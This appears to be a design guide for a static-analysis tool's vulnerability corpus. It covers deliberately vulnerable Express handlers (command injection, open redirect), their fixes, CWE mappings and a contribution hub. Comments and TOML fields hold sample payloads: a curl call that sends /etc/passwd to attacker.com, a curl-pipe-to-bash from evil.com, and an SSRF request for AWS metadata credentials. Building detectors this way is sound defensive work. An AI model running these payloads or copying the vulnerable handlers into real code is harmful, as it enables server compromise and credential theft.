# Frensense — Corpus Quality Guide & Corpus Exchange

---

## Why the Current Corpus Is Low Quality (The Diagnosis)

Reading the actual files reveals two tiers of quality that exist side by side.

**The problem pattern** — `ts_open_redirect_positive.ts`:
```typescript
function redirect(next: string) {
    res.redirect(next);
}
```
Three lines. No import. No `req` parameter. `res` is a mystery variable.
No `[frensense]` comment block. The engine fingerprints this and gets almost
nothing: one API call hash (`res.redirect`), no control flow, no signature
n-grams, no taint source. Every Express route handler that calls `res.redirect`
anywhere will score near 1.0 against this.

**The good pattern** — `ts_cmdi_exec_direct_m10_positive.ts`:
```typescript
// [frensense]
// observation: User-controlled input is passed to exec() without sanitization 
//              across an async/await boundary.
// impact: An attacker can execute arbitrary system commands.
// improvement: Validate the command against an allowlist or use execFile

import { exec } from "child_process";

async function getCommand(req: any): Promise<string> { return req.query.cmd; }
async function getTask(req: any): Promise<string> { return req.body.task; }

async function handler(req: any, res: any) {
    const cmd = await getCommand(req);
    exec(cmd);
}
```
Real import. Multiple functions showing the pattern in different call shapes.
HTTP handler with typed parameters. `req.query.cmd` gives the engine a taint
source. The engine extracts: full API call hash for `exec`, taint flow path
`UserInputSource → CommandExecutionSink`, async control flow markers,
`child_process` import for semantic filter.

The TOML metadata situation is worse. `ts_ssrf_fetch.toml` contains:
```toml
id = "TS_SSRF_FETCH"
observation = "Corpus pattern: Ts Ssrf Fetch."
impact = "Function shape matches a known violation pattern."
improvement = "Review against corpus example."
```
This is auto-generated text. It tells a developer nothing actionable.

**The root cause:** Most of the 1,662 positives were generated programmatically
by an LLM asked to produce examples. LLMs write toy code — minimal, isolated,
with no real framework context, no imports, no surrounding functions. Real
vulnerable code in production has 5–15 functions in a file, real type
annotations, real library imports, and the vulnerable pattern buried inside
business logic. The engine was trained on toy code and is now surprised by
production code.

---

## What a High-Quality Corpus Pair Looks Like

### The Anatomy of a Good Positive

A high-quality positive file must satisfy all of these:

```
✓  Has a [frensense] block with human-written observation/impact/improvement
✓  Has at least one real import statement
✓  Has 2–5 functions, not just one
✓  The vulnerable function has a proper HTTP handler signature (req, res, ctx, c)
✓  The taint source is named (req.body.X, r.URL.Query().Get("X"), c.Query("X"))
✓  The sink call is present (exec, query, fetch, readFile, res.redirect)
✓  The file is realistic enough that it could plausibly be found in a real repo
✓  Uses typed parameters where the language supports it (not `req: any` everywhere)
✓  Has surrounding business logic — a real function name, real variable names
✓  The bug is in a function the engine will find (inside a named function, not at top level)
```

### The Anatomy of a Good Negative

A high-quality negative file must satisfy all of these:

```
✓  Has a // SAFE: comment explaining what fix was applied
✓  Has exactly the same structure as the positive (same imports, same functions,
   same parameter names) — only the fix differs
✓  The fix is the REAL fix used in production (not a toy allowlist like ["ls","pwd"])
✓  Has at least 2 negatives per positive:
     negative.ts  — primary fix (e.g. parameterized query)
     negative2.ts — alternate fix (e.g. ORM instead of raw SQL)
✓  The negative still has the same sink call — it just uses it safely
   (exec is still there, but with an allowlist and no user input)
✓  Does NOT simply delete the vulnerable call — that produces a negative that
   teaches the engine "no exec = safe" which is wrong
```

### Template: Perfect CMDI Pair

**`ts_cmdi_exec_shell_positive.ts`:**
```typescript
// [frensense]
// observation: User-controlled input from req.body.script is passed to exec()
//              via shell string interpolation, allowing arbitrary command execution.
// impact: An attacker can execute any OS command by sending a crafted script 
//         value such as "ls; curl https://attacker.com/exfil?d=$(cat /etc/passwd)".
// improvement: Replace exec() with execFile() and pass arguments as an array,
//              or validate script against a strict allowlist before execution.
//              Never interpolate user input into a shell string.

import { exec } from "child_process";
import express from "express";
import { Router } from "express";

const router = Router();

async function resolveScript(scriptName: string): Promise<string> {
    // Pretends to resolve a user-provided script name
    return `/scripts/${scriptName}`;
}

router.post("/api/jobs/run", async (req: express.Request, res: express.Response) => {
    const { script, args } = req.body as { script: string; args: string };
    const resolved = await resolveScript(script);
    exec(`${resolved} ${args}`, (err, stdout, stderr) => {
        if (err) {
            return res.status(500).json({ error: stderr });
        }
        res.json({ output: stdout });
    });
});

router.post("/api/admin/command", (req: express.Request, res: express.Response) => {
    const cmd = req.body.cmd as string;
    exec(cmd, (error, stdout) => {
        res.json({ result: stdout, error: error?.message });
    });
});

export default router;
```

**`ts_cmdi_exec_shell_negative.ts`** (fix: execFile + strict allowlist):
```typescript
// SAFE: Replaced exec() with execFile() — arguments are passed as an array,
//       preventing shell interpretation. Script names validated against allowlist.

import { execFile } from "child_process";
import express from "express";
import { Router } from "express";

const router = Router();
const ALLOWED_SCRIPTS = new Set(["report", "backup", "health-check"]);
const ALLOWED_ARGS_RE = /^[a-zA-Z0-9_\-\.]+$/;

router.post("/api/jobs/run", async (req: express.Request, res: express.Response) => {
    const { script, args } = req.body as { script: string; args: string };
    if (!ALLOWED_SCRIPTS.has(script)) {
        return res.status(403).json({ error: "Script not permitted" });
    }
    if (args && !ALLOWED_ARGS_RE.test(args)) {
        return res.status(400).json({ error: "Invalid argument format" });
    }
    const scriptPath = `/scripts/${script}`;
    execFile(scriptPath, args ? [args] : [], (err, stdout, stderr) => {
        if (err) return res.status(500).json({ error: "Execution failed" });
        res.json({ output: stdout });
    });
});

router.post("/api/admin/command", (req: express.Request, res: express.Response) => {
    return res.status(403).json({ error: "Direct command execution not permitted" });
});

export default router;
```

**`ts_cmdi_exec_shell_negative2.ts`** (alternate fix: child_process with fixed binary):
```typescript
// SAFE: Command is selected from a fixed internal mapping; no user string
//       reaches the shell. execFile() used with static binary path.

import { execFile } from "child_process";
import express from "express";
import { Router } from "express";

const router = Router();

const JOB_MAP: Record<string, { bin: string; args: string[] }> = {
    report:  { bin: "/usr/local/bin/report-gen", args: ["--json"] },
    backup:  { bin: "/usr/local/bin/backup",     args: ["--incremental"] },
};

router.post("/api/jobs/run", async (req: express.Request, res: express.Response) => {
    const jobName = req.body.script as string;
    const job = JOB_MAP[jobName];
    if (!job) {
        return res.status(400).json({ error: "Unknown job" });
    }
    execFile(job.bin, job.args, (err, stdout) => {
        if (err) return res.status(500).json({ error: "Job failed" });
        res.json({ output: stdout });
    });
});

export default router;
```

---

## The Five Corpus Tiers

Not all patterns need the same depth. Assign each pattern a tier based on
how hard the vulnerability is to detect and how important it is to get right.

### Tier 1 — Core Security (CWE-mapped, highest impact)

Injection, path traversal, SSRF, open redirect, XSS. These are the patterns
that get CVEs, cause data breaches, and appear in bug bounty programs.

**Requirements for Tier 1:**
- Minimum 3 positive files per base pattern + 4 mutation variants = 7 positives
- Minimum 4 negative files per base pattern (primary fix + 3 alternate fixes)
- Real framework context (Express, Gin, Axum — not abstract functions)
- 2+ functions per file (the vulnerable one + a helper that feeds it)
- Typed parameters throughout
- Full `[frensense]` block with CVE reference if one exists
- CWE identifier in TOML
- CVSS v3 score in TOML
- Runtime probe template linked (`runtime_probe: "cmdi"`)

**Categories in Tier 1:**
`*_cmdi`, `*_sqli`, `*_ssrf`, `*_xss`, `*_path`, `ts_open_redirect`,
`*_eval`, `ts_prototype_pollution`, `*_deserialization`, `ts_ldap`,
`ts_xpath`, `ts_ssti`, `ts_nosqli`, `go_xxe`

---

### Tier 2 — Authentication & Access Control

Auth bypass, IDOR, JWT vulnerabilities, CORS misconfig, CSRF, broken session
management. These are harder to detect statically but extremely high impact
when present.

**Requirements for Tier 2:**
- Minimum 2 positive files per base pattern + 3 mutation variants
- Minimum 3 negative files
- Must include the surrounding auth middleware context (not just the handler)
- Must show the flow: auth check → [vulnerable: skipped or bypassable] → action
- OWASP Top 10 category noted in TOML (`owasp: "A01:2021"`)
- CWE identifier required

**Categories in Tier 2:**
`ts_jwt`, `ts_auth`, `*_idor`, `ts_bac`, `ts_rbac`, `ts_cors`,
`ts_csrf`, `ts_session`, `ts_oauth`, `ts_oidc`, `ts_cookie`,
`ts_mfa`, `ts_ratelimit`, `go_auth`, `rust_auth`

---

### Tier 3 — Logic & Business Bugs

Race conditions, TOCTOU, integer overflow, missing payment gates, missing
ownership checks. These require contextual understanding that is harder to
fingerprint but very valuable.

**Requirements for Tier 3:**
- Minimum 2 positive files + 2 mutation variants
- Minimum 2 negative files
- The positive MUST show the temporal/logical flow that creates the bug
  (check then act, not just the action alone)
- Comments explaining what makes this a bug (not always obvious)
- `exploit_scenario` field in TOML (a concrete attacker narrative)

**Categories in Tier 3:**
`ts_race`, `ts_toctou`, `ts_integer`, `rust_race`, `rust_deadlock`,
`ts_missing_payment_gate`, `ts_missing_ownership_check`, `rust_integer`,
`go_crypto`

---

### Tier 4 — Code Quality with Security Impact

Crypto weaknesses, insecure randomness, hardcoded secrets, error information
leakage, insecure defaults. Important but lower likelihood of direct exploitation.

**Requirements for Tier 4:**
- Minimum 1 positive + 2 mutation variants
- Minimum 2 negative files
- Clear comment on WHY this is a problem (not always obvious that MD5 is bad)
- Link to a reference (NIST, OWASP) in TOML

**Categories in Tier 4:**
`*_crypto`, `ts_hardcoded`, `ts_regex`, `ts_env`, `ts_debug`,
`rust_rand`, `rust_crypto`, `ts_weak`, `ts_error`

---

### Tier 5 — Framework-Specific & LLM-Generated Antipatterns

React hook bugs, async Rust patterns, LLM-generated code antipatterns.
These are novel, framework-specific, and often have no CWE mapping.

**Requirements for Tier 5:**
- Minimum 1 positive + 1 negative
- If the bug is not a security bug, the `is_security: false` flag must be set
- Must have a `remediation_effort: "low|medium|high"` estimate
- TOML `category: "correctness"` or `"performance"` instead of `"security"`

**Categories in Tier 5:**
`tsx_useeffect`, `tsx_usememo`, `rust_async`, `ts_llm_*`, `tsx_*`,
`rust_transmute`, `rust_edition2024`

---

## CWE Mapping

Add CWE identifiers to the TOML metadata and to the `[frensense]` comment block.
This allows teams to filter findings by standard classifications and feeds into
compliance reporting (SOC2, PCI-DSS, ISO27001).

### Complete Category → CWE Map

| Pattern prefix | Vulnerability | CWE | OWASP 2021 | CVSS Base (typical) |
|---|---|---|---|---|
| `*_cmdi` | OS Command Injection | CWE-78 | A03: Injection | 9.8 Critical |
| `*_sqli` | SQL Injection | CWE-89 | A03: Injection | 9.8 Critical |
| `ts_nosqli`, `ts_mongo` | NoSQL Injection | CWE-943 | A03: Injection | 8.8 High |
| `ts_ldap` | LDAP Injection | CWE-90 | A03: Injection | 8.8 High |
| `ts_xpath` | XPath Injection | CWE-643 | A03: Injection | 7.5 High |
| `ts_ssti` | Template Injection | CWE-1336 | A03: Injection | 9.8 Critical |
| `*_xss`, `tsx_xss`, `tsx_dangerously` | Cross-Site Scripting | CWE-79 | A03: Injection | 6.1 Medium |
| `*_ssrf` | Server-Side Request Forgery | CWE-918 | A10: SSRF | 8.8 High |
| `*_path` | Path Traversal | CWE-22 | A01: Broken Access Control | 7.5 High |
| `ts_open` | Open Redirect | CWE-601 | A01: Broken Access Control | 6.1 Medium |
| `ts_eval` | Code Injection | CWE-95 | A03: Injection | 9.8 Critical |
| `ts_prototype` | Prototype Pollution | CWE-1321 | A03: Injection | 9.8 Critical |
| `ts_deserialization` | Insecure Deserialization | CWE-502 | A08: Software Integrity | 8.8 High |
| `go_xxe`, `ts_xxe` | XML External Entity | CWE-611 | A05: Misconfig | 7.5 High |
| `*_idor` | IDOR | CWE-639 | A01: Broken Access Control | 7.5 High |
| `ts_bac`, `ts_rbac` | Broken Access Control | CWE-284 | A01: Broken Access Control | 8.8 High |
| `*_jwt` | JWT Algorithm Confusion | CWE-345 | A02: Cryptographic Failures | 9.1 Critical |
| `ts_auth` | Authentication Bypass | CWE-287 | A07: Auth Failures | 9.8 Critical |
| `ts_oauth`, `ts_oidc` | OAuth/OIDC Misconfig | CWE-287 | A07: Auth Failures | 8.8 High |
| `ts_session` | Session Fixation | CWE-384 | A07: Auth Failures | 8.8 High |
| `ts_csrf` | Cross-Site Request Forgery | CWE-352 | A01: Broken Access Control | 8.8 High |
| `ts_cors` | CORS Wildcard + Credentials | CWE-942 | A05: Misconfig | 8.8 High |
| `ts_cookie` | Insecure Cookie | CWE-614 | A02: Cryptographic Failures | 5.4 Medium |
| `ts_hardcoded` | Hardcoded Credentials | CWE-798 | A02: Cryptographic Failures | 9.8 Critical |
| `*_crypto` | Weak Cryptographic Algorithm | CWE-327 | A02: Cryptographic Failures | 7.5 High |
| `rust_rand`, `ts_weak` | Insecure Randomness | CWE-338 | A02: Cryptographic Failures | 7.5 High |
| `ts_regex` | ReDoS | CWE-1333 | A06: Vulnerable Components | 7.5 High |
| `ts_race`, `rust_race` | Race Condition / TOCTOU | CWE-362 | — | 7.0 High |
| `rust_deadlock` | Deadlock | CWE-833 | — | 5.9 Medium |
| `rust_transmute`, `rust_unsafe` | Memory Corruption | CWE-119 | — | 9.8 Critical |
| `rust_integer`, `ts_integer` | Integer Overflow | CWE-190 | — | 7.5 High |
| `ts_ratelimit` | Missing Rate Limit | CWE-770 | A04: Insecure Design | 5.3 Medium |
| `ts_env` | Exposed Environment Variable | CWE-526 | A02: Cryptographic Failures | 5.3 Medium |
| `ts_error` | Information Exposure via Error | CWE-209 | A05: Misconfig | 4.3 Medium |
| `ts_prototype_pollution` | Prototype Pollution | CWE-1321 | A03: Injection | 8.8 High |
| `tsx_useeffect_*` | Hook Logic Error | — (React-specific) | — | N/A |
| `rust_async_*` | Async Correctness | — (Rust-specific) | — | N/A |
| `ts_llm_*` | LLM-Generated Antipattern | — (Novel) | — | varies |

---

## Injecting CWE into the Corpus Format

### Update the `[frensense]` comment block schema

Add two new optional fields to the comment block parser in `loader.rs`:

```typescript
// [frensense]
// observation: User-controlled URL is passed to fetch() without host validation.
// impact: Server can be used as a proxy to reach internal services.
// improvement: Validate URL against an allowlist of permitted external hosts.
// cwe: CWE-918
// cvss: 8.8
// owasp: A10:2021
// severity: High
// runtime_probe: ssrf
```

The loader parses these fields and stores them on `AdvisoryText`:

```rust
// frensense-engine/src/corpus/loader.rs
pub struct AdvisoryText {
    pub observation: Option<String>,
    pub impact: Option<String>,
    pub improvement: Option<String>,
    pub expected_context: Option<crate::context::FileContext>,
    // NEW:
    pub cwe: Option<String>,           // "CWE-918"
    pub cvss: Option<f32>,             // 8.8
    pub owasp: Option<String>,         // "A10:2021"
    pub severity: Option<String>,      // "Critical|High|Medium|Low|Info"
    pub runtime_probe: Option<String>, // "ssrf" — links to probe template
}
```

### Update the TOML schema

For patterns that use TOML instead of inline comments:

```toml
# corpus/targets/ts_ssrf_fetch.toml  — UPDATED
id = "TS_SSRF_FETCH"
severity = "High"
cwe = "CWE-918"
cvss = 8.8
owasp = "A10:2021"
is_security = true
tier = 1
runtime_probe = "ssrf"
exploit_scenario = """
An attacker sends POST /api/proxy with body {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}. 
The server fetches the AWS metadata endpoint and returns the IAM credentials in the response body.
"""
observation = "User-controlled URL is passed to fetch() without validating the target host."
impact = "An attacker can reach internal services, cloud metadata endpoints, or scan the internal network."
improvement = "Validate the URL against a strict allowlist of permitted external hosts and schemes."

[expected_context]
environment = "RouteHandler"
sensitivity = "High"
frameworks = ["express", "fastify", "hono"]
```

### Surface CWE in output

In `Advisory` and JSON/SARIF output, surface the CWE:

```json
{
  "rule_id": "ts_ssrf_aws_metadata",
  "cwe": "CWE-918",
  "cvss": 8.8,
  "owasp": "A10:2021",
  "severity": "High",
  "confidence": 0.89,
  "file": "src/routes/proxy.ts",
  "line": 14,
  "observation": "User-controlled URL passed to fetch() without host validation."
}
```

In SARIF, map CWE to the rule's `relationships` array per the SARIF 2.1 spec:

```json
{
  "rules": [{
    "id": "ts_ssrf_aws_metadata",
    "relationships": [{
      "target": { "id": "CWE-918", "toolComponent": { "name": "CWE" } },
      "kinds": ["superset"]
    }]
  }]
}
```

---

## Fixing the Existing Low-Quality Corpus

The 1,662 existing positives need a quality pass before the engine can learn
properly. Rather than rewriting all of them, apply a triage process:

### Step 1 — Auto-score each pair

Write a `corpus-quality` tool that scores each pair on 0–100:

```
+20  Has [frensense] block with all 3 fields (observation, impact, improvement)
+15  Has at least one import statement
+15  Has 2+ functions in the file
+15  Has a typed HTTP handler parameter (not `req: any`)
+10  Taint source is explicit (req.body.X, not just req)
+10  Has CWE in comment or TOML
+10  Negative uses the SAME sink call safely (not just deletes the call)
-20  File is under 10 lines
-20  Uses placeholder names (foo, bar, test, doStuff)
-10  req typed as `any` throughout
-10  Only one function in the file
```

Run it:
```
cargo run --bin corpus-quality -- corpus/targets/
```

Output: a TSV with `pattern_id, score, failing_checks`. Sort by score ascending.
Everything below 50 is a rewrite candidate.

The `ts_open_redirect` at 3 lines scores about 10. The `ts_cmdi_exec_direct_m10`
scores about 85. This gives a priority queue for the quality pass.

### Step 2 — Rewrite below-50 pairs using a human-in-the-loop process

The rewrite process for each low-quality pair:

1. Keep the **pattern name** and the **core buggy concept** — only rewrite the code
2. Add a real framework import and HTTP handler context
3. Add a helper function that makes the taint path explicit
4. Write a proper `[frensense]` block
5. Add CWE and runtime_probe to TOML
6. Rewrite the negative to use the same structure with a real fix
7. Add a `negative2` with an alternate fix

The `ts_open_redirect_positive.ts` rewrite:

```typescript
// [frensense]
// observation: The redirect destination is taken directly from req.query.next
//              without validating that it points to the same origin.
// impact: An attacker can craft a link like /login?next=https://evil.com that
//         redirects users to a phishing site after a successful login.
// improvement: Validate that `next` is a relative path (starts with /) and does
//              not contain a protocol or host component before redirecting.
// cwe: CWE-601
// cvss: 6.1
// owasp: A01:2021
// runtime_probe: redirect

import express from "express";
import { Router } from "express";

const router = Router();

function getRedirectTarget(req: express.Request): string {
    return req.query.next as string ?? "/dashboard";
}

router.get("/login", (req: express.Request, res: express.Response) => {
    // ... auth logic ...
    const target = getRedirectTarget(req);
    res.redirect(target);
});

router.post("/logout", (req: express.Request, res: express.Response) => {
    req.session?.destroy(() => {
        const next = req.body.returnTo as string;
        res.redirect(next ?? "/");
    });
});

export default router;
```

---

## Frensense Hub — The Corpus Exchange

### Concept

Frensense Hub is a public registry where security researchers, engineers, and
contributors submit corpus pairs. Think Nuclei templates but for corpus-driven
static analysis: a searchable, versioned, community-maintained library of
buggy/fixed code pairs.

The key difference from Nuclei: Frensense Hub submissions are **code pairs**,
not YAML probe templates. A researcher submits a positive and negative file.
Automated quality gates score the submission. Human review approves Tier 1 and 2.
Tier 4 and 5 auto-merge after quality gates pass.

### Hub Repository Structure

```
frensense-hub/
├── README.md
├── CONTRIBUTING.md
├── patterns/
│   ├── typescript/
│   │   ├── injection/
│   │   │   ├── cmdi/
│   │   │   │   ├── exec-shell-interpolation/
│   │   │   │   │   ├── README.md                 ← human explanation
│   │   │   │   │   ├── meta.toml                 ← CWE, CVSS, tier, runtime_probe
│   │   │   │   │   ├── positive.ts               ← the buggy code
│   │   │   │   │   ├── negative.ts               ← primary fix
│   │   │   │   │   ├── negative2.ts              ← alternate fix
│   │   │   │   │   ├── negative3.ts              ← optional third fix
│   │   │   │   │   └── mutations/
│   │   │   │   │       ├── m1_helper_extraction_positive.ts
│   │   │   │   │       ├── m1_helper_extraction_negative.ts
│   │   │   │   │       ├── m2_async_await_positive.ts
│   │   │   │   │       └── m2_async_await_negative.ts
│   │   │   │   └── spawn-arg-injection/
│   │   │   │       └── ...
│   │   │   ├── sqli/
│   │   │   ├── ssrf/
│   │   │   └── xss/
│   │   ├── access-control/
│   │   │   ├── idor/
│   │   │   ├── auth-bypass/
│   │   │   └── rbac-missing/
│   │   └── cryptography/
│   │       ├── weak-hash/
│   │       └── insecure-random/
│   ├── rust/
│   │   ├── injection/
│   │   ├── memory/
│   │   └── async/
│   ├── go/
│   │   ├── injection/
│   │   └── auth/
│   ├── python/           ← future
│   └── php/              ← future
├── cwe-index.json        ← maps CWE IDs to pattern directories
├── owasp-index.json      ← maps OWASP categories to pattern directories
└── quality-scores.json   ← auto-updated by CI — current quality score per pattern
```

### `meta.toml` — The Canonical Metadata Format

Every pattern directory must have a `meta.toml`:

```toml
# Required fields
id = "ts-cmdi-exec-shell-interpolation"
title = "Command injection via shell string interpolation"
tier = 1
cwe = "CWE-78"
cvss_base = 9.8
cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
owasp = "A03:2021"
severity = "Critical"
languages = ["typescript", "javascript"]
frameworks = ["express", "fastify", "hono", "nestjs"]
runtime_probe = "cmdi"
is_security = true
category = "injection"

# Human narrative
observation = """
User-controlled input is passed to exec() or execSync() via shell string
interpolation, allowing injection of shell metacharacters.
"""
impact = """
An attacker can execute arbitrary OS commands by sending a crafted payload
such as 'ls; curl https://attacker.com/?d=$(cat /etc/passwd)'.
This typically results in full server compromise.
"""
improvement = """
Replace exec() with execFile() and pass user-controlled values as elements
of the arguments array — never via string interpolation. Alternatively,
validate input against a strict allowlist before constructing the command.
"""
exploit_scenario = """
POST /api/jobs/run  {"script": "report", "args": "; curl https://evil.com/shell.sh | bash"}
The args value injects a second command. The shell executes both the
intended script AND the attacker's payload.
"""

# References
references = [
    "https://cwe.mitre.org/data/definitions/78.html",
    "https://owasp.org/www-community/attacks/Command_Injection",
    "https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback",
]

# Optional: link to real-world CVEs that this pattern covers
cves = ["CVE-2022-24765"]  # git CVE — example of exec injection

# Submission metadata
submitted_by = "github:researcher-handle"
reviewed_by = "github:frensense-team"
approved_at = "2024-03-15"
quality_score = 91
```

### Quality Gates (CI Enforced)

Every PR to Frensense Hub runs the quality checker automatically. The PR
cannot merge until all gates pass for its tier.

```yaml
# .github/workflows/quality-gate.yml

gates:
  all_tiers:
    - name: Has meta.toml with required fields
      check: meta_toml_complete
      required: true
    - name: Positive file has [frensense] block
      check: has_frensense_block
      required: true
    - name: Positive has >= 2 functions
      check: function_count >= 2
      required: true
    - name: Positive has import statement
      check: has_import
      required: true
    - name: Negative uses same sink call
      check: sink_call_present_in_negative
      required: true
    - name: quality_score >= 60
      check: quality_score
      required: true

  tier_1_only:
    - name: Has CWE identifier
      check: has_cwe
      required: true
    - name: Has CVSS score
      check: has_cvss
      required: true
    - name: Has runtime_probe field
      check: has_runtime_probe
      required: true
    - name: Has exploit_scenario
      check: has_exploit_scenario
      required: true
    - name: Has at least 2 negatives
      check: negative_count >= 2
      required: true
    - name: quality_score >= 80
      check: quality_score
      required: true
    - name: Human review required
      check: approved_by_maintainer
      required: true
```

### Contribution Workflow

```
1. Fork frensense-hub
2. Run: frensense-hub new --category cmdi --language typescript
   → Scaffolds the directory with template files and prompts for meta.toml fields
3. Write your positive.ts, negative.ts, negative2.ts
4. Run: frensense-hub check patterns/typescript/injection/cmdi/my-pattern/
   → Local quality gate run, shows score and failing checks
5. Commit and open a PR
6. CI runs the full quality gate suite + the Frensense engine against the new
   pair to verify it actually fires on the positive and not on the negative
7. Maintainer review (required for Tier 1 and 2)
8. Merge → nightly build picks it up → next corpus bundle release
```

### The `frensense-hub` CLI

A standalone tool (separate from the main Frensense binary) for corpus authors:

```
frensense-hub new --category ssrf --language go --framework gin
  → Scaffolds go/injection/ssrf/gin-http-client/ with templates

frensense-hub check patterns/go/injection/ssrf/gin-http-client/
  → Runs quality gate, shows score breakdown

frensense-hub validate patterns/go/injection/ssrf/gin-http-client/
  → Runs the Frensense engine against the pair
  → Asserts positive.go fires at confidence >= 0.75
  → Asserts negative.go does NOT fire at confidence >= 0.6
  → Prints: PASS (positive: 0.89, negative: 0.12)

frensense-hub stats
  → Shows total patterns per CWE, tier, language, framework
  → Highlights coverage gaps (CWE-90 has only 2 patterns, needs more)

frensense-hub gaps
  → "Missing: Go+Gin SSRF patterns (only net/http covered)"
  → "Missing: Rust+Actix SQLi (only Axum covered)"
  → "Missing: TypeScript LDAP injection for NestJS"
```

---

## Mutation Guidelines

Every base pattern should have M1–M5 mutation variants. Mutations make the
engine robust to the code transformations attackers use to evade detection.

| Mutation | What changes | What stays the same |
|---|---|---|
| M1 Helper extraction | Vulnerable logic moved into a separate helper function | The taint source and sink |
| M2 Async/await | `exec(cmd)` → `await execAsync(cmd)` (promisified) | The exec call with user input |
| M3 Class method | Module function → class method | The parameter source and sink |
| M4 Different variable name | `cmd` → `userInput` → `command` → `payload` | The taint path structure |
| M5 Error handling wrapper | Vulnerable call wrapped in try/catch | The unsanitized call still inside |
| M6 Conditional execution | `if (enabled) { exec(cmd) }` | User input still reaches exec |
| M7 Array destructuring | `const [cmd] = req.body.cmds` instead of `req.body.cmd` | Same taint, different syntax |

Each mutation gets its own `positive_mN.ts` and `negative_mN.ts`. The negative
is the M1-mutated version of the primary negative, not a new fix.

---

## Coverage Gaps to Fill First

Based on the current corpus distribution (`ls corpus/targets | sort -u`), these
are the most valuable gaps:

### Missing Languages
- **Python**: Zero patterns. Flask, FastAPI, Django all missing entirely.
  Most web servers are still Python. This is the single largest gap.
- **PHP**: Zero patterns. Laravel still powers 30%+ of the web.
- **Java**: Zero patterns. Spring Boot is dominant in enterprise.

### Missing Frameworks (existing languages)
- **TypeScript + tRPC**: Only stub coverage. tRPC is increasingly common.
- **Rust + Rocket**: Some patterns but not across all injection categories.
- **Go + Fiber**: Only Gin and net/http covered.

### Missing Vulnerability Classes
- **HTTP Request Smuggling** (`ts_smuggling` exists but only 1 pair)
- **GraphQL injection** (`ts_graphql` has 12 patterns but no query injection)
- **WebSocket injection** (`ts_websocket` / `ts_ws` — not in corpus)
- **gRPC injection** (`rust_tonic` has patterns but none for input injection)
- **LDAP injection for Go** (`ts_ldap` exists but `go_ldap` missing)

### Undertested CWEs
| CWE | Current count | Target |
|---|---|---|
| CWE-90 (LDAP) | 2 | 15 |
| CWE-643 (XPath) | 3 | 10 |
| CWE-352 (CSRF) | 4 | 15 |
| CWE-502 (Deserialization) | 5 | 20 |
| CWE-601 (Open Redirect) | 3 | 15 |
| CWE-833 (Deadlock) | 4 | 10 |

---

## Summary: The Three Things That Will Fix Corpus Quality

**1. The quality gate enforces standards on every new submission.**
Nothing merges to the corpus without passing the tier-appropriate gate.
This stops the rot from getting worse immediately.

**2. The rewrite pass fixes existing patterns below score 50.**
The `corpus-quality` tool identifies the worst offenders. Rewriting 200 thin
patterns (those under 50 points) will do more for engine accuracy than adding
200 new patterns. Quality over quantity.

**3. Frensense Hub opens the corpus to the community.**
The internal team cannot cover Python, PHP, Java, and every framework.
A public submission process with clear standards and automated quality gates
allows the security research community to fill the gaps. The CWE index
makes it easy for a researcher to say "I want to add a pattern for CWE-90"
and find the right place to put it.

The corpus is the moat. A well-structured, community-maintained, CWE-mapped
corpus is a moat that compounds over time — not just because it grows, but
because the community has a stake in its quality.
